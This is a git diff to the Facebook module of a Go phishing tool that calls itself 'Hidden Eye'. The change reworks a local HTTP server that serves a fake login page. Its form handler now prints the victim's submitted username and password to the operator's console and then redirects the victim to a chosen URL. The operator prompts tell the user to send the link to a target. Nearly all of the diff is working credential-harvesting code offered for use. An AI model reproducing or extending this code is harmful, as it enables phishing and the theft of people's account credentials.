@@ -9,7 +9,13 @@ import (
 	"strconv"
 )
 
+type Phishing struct {
+	port int
+	url  string
+}
+
 func Facebook() {
+	var ph Phishing
 	helpers.Clear_screen()
 	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Facebook module is loaded sucessfully\t")
 	fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Select Mode\t")
@@ -56,8 +62,7 @@ func Facebook() {
 
 			fmt.Print(Colors.Red(), "\nRedirect URL >> "+Colors.White())
 
-			var url string
-			fmt.Scanln(&url)
+			fmt.Scanln(&ph.url)
 
 			helpers.Clear_screen()
 			helpers.Prompt()
@@ -68,9 +73,7 @@ func Facebook() {
 
 			fmt.Print(Colors.Red(), "\nRedirect Port >> "+Colors.White())
 
-			var port int
-
-			_, err := fmt.Scanln(&port)
+			_, err := fmt.Scanln(&ph.port)
 			if err != nil {
 				fmt.Println(err)
 			}
@@ -103,11 +106,11 @@ func Facebook() {
 
 			if option == 1 {
 				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Send this URL to the target on the same nertwork")
-				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.Green(), " Localhost URL : https://localhost:", port)
-				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Hidden Eye is Listening to https://localhost:", port)
+				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.Green(), " Localhost URL : https://localhost:", ph.port)
+				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Hidden Eye is Listening to https://localhost:", ph.port)
 				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Waiting for the target to Interact")
 
-				handlerPhising(port)
+				handlerPhising(ph.port, ph.url)
 			}
 
 		}
@@ -119,13 +122,13 @@ func Facebook() {
 var tpl *template.Template
 
 func init() {
-	tpl = template.Must(template.ParseGlob("templates/*.gohtml"))
+	tpl = template.Must(template.ParseGlob("templates/facebook/*.gohtml"))
 }
 
-func handlerPhising(p int) {
+func handlerPhising(p int, url string) {
 	port := strconv.Itoa(p)
 	http.HandleFunc("/", index)
-	http.HandleFunc("/process", processor)
+	http.HandleFunc("/process", processor(url))
 	http.ListenAndServe(":"+port, nil)
 }
 
@@ -134,29 +137,65 @@ func index(w http.ResponseWriter, r *http.Request) {
 	tpl.ExecuteTemplate(w, "index.gohtml", nil)
 }
 
-func processor(w http.ResponseWriter, r *http.Request) {
-	if r.Method != "POST" {
-		http.Redirect(w, r, "/", http.StatusSeeOther)
-		return
+func processor(url string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+
+		if r.Method != "POST" {
+			http.Redirect(w, r, "/", http.StatusSeeOther)
+			return
+		}
+
+		fname := r.FormValue("firster")
+		lname := r.FormValue("laster")
+		// surf := r.FormValue("surf")
+		// snow := r.FormValue("snow")
+		// skate := r.FormValue("skate")
+		// radio := r.FormValue("cow")
+
+		fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Username : ", Colors.Green(), fname,
+			Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Password : ", Colors.Green(), lname)
+
+		// d := struct {
+		// 	First, Last, Surf, Snow, Skate, Radio string
+		// }{
+		// 	First: fname,
+		// 	Last:  lname,
+		// 	Surf:  surf,
+		// 	Snow:  snow,
+		// 	Skate: skate,
+		// 	Radio: radio,
+		// }
+
+		http.Redirect(w, r, "https://"+url, http.StatusSeeOther)
 	}
-
-	// fname := r.FormValue("firster")
-	// lname := r.FormValue("laster")
-	// surf := r.FormValue("surf")
-	// snow := r.FormValue("snow")
-	// skate := r.FormValue("skate")
-	// radio := r.FormValue("cow")
-
-	// d := struct {
-	// 	First, Last, Surf, Snow, Skate, Radio string
-	// }{
-	// 	First: fname,
-	// 	Last:  lname,
-	// 	Surf:  surf,
-	// 	Snow:  snow,
-	// 	Skate: skate,
-	// 	Radio: radio,
-	// }
-
-	http.Redirect(w, r, "http://www.golang.org", http.StatusSeeOther)
 }
+
+// func processor(w http.ResponseWriter, r *http.Request) {
+
+// 	if r.Method != "POST" {
+// 		http.Redirect(w, r, "/", http.StatusSeeOther)
+// 		return
+// 	}
+
+// 	fname := r.FormValue("firster")
+// 	lname := r.FormValue("laster")
+// 	// surf := r.FormValue("surf")
+// 	// snow := r.FormValue("snow")
+// 	// skate := r.FormValue("skate")
+// 	// radio := r.FormValue("cow")
+
+// 	fmt.Println(fname, lname)
+
+// 	// d := struct {
+// 	// 	First, Last, Surf, Snow, Skate, Radio string
+// 	// }{
+// 	// 	First: fname,
+// 	// 	Last:  lname,
+// 	// 	Surf:  surf,
+// 	// 	Snow:  snow,
+// 	// 	Skate: skate,
+// 	// 	Radio: radio,
+// 	// }
+
+// 	http.Redirect(w, r, "http://www.golang.org", http.StatusSeeOther)
+// }
